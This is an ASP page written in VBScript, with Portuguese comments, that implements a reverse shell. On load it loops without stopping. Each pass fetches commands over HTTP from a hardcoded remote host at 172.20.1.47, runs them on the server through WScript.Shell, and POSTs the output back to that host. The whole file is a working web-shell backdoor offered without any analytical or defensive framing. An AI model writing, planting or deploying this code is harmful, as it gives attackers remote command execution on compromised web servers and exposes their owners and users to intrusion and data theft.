<%@ Language=VBScript %>
<%
' Configurações
Dim remoteHost, remotePort, objShell, objExec, strCommand, strOutput, objHttp

remoteHost = "172.20.1.47" ' Endereço IP do servidor remoto
remotePort = 80 ' Porta do servidor remoto

Set objShell = Server.CreateObject("WScript.Shell")

' Função para criar a conexão de shell reverso
Function ReverseShell()
    Set objHttp = Server.CreateObject("MSXML2.ServerXMLHTTP")
    
    Do
        ' Recebe o comando do servidor
        objHttp.open "GET", "http://" & remoteHost & ":" & remotePort & "/cmd", False
        objHttp.send ""
        
        strCommand = objHttp.responseText
        
        ' Executa o comando
        If strCommand <> "" Then
            Set objExec = objShell.Exec(strCommand)
            
            ' Aguarda a execução do comando e lê a saída
            Do While Not objExec.StdOut.AtEndOfStream
                strOutput = strOutput & objExec.StdOut.ReadLine() & vbCrLf
            Loop
            
            ' Envia a saída de volta ao servidor
            objHttp.open "POST", "http://" & remoteHost & ":" & remotePort & "/output", False
            objHttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
            objHttp.send "output=" & Server.URLEncode(strOutput)
        End If
        
        ' Limpa a saída para o próximo comando
        strOutput = ""
        
    Loop
End Function

' Chama a função de reverse shell
Call ReverseShell()
%>

